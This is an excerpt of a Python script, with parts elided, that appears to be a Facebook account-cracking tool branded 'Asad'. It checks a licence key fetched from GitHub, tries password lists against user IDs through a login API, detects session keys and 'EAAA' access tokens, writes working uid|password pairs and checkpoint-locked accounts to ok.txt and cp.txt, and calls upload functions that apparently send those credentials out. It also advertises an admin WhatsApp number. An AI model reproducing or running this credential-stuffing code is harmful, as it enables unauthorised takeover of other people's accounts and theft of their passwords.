...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +923088076241")
	subprocess.check_output(["am", "start", "https://wa.me/+923088076241"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/asadaly24/OLD/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;37m================= \33[32;4mASAD\33[0;m =====================
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Asad] : %s/%s -> \033[0;92m [ Asad-OK:%s ]- \033[0;93m[HAMII-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Asad-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[Asad-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Asad-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
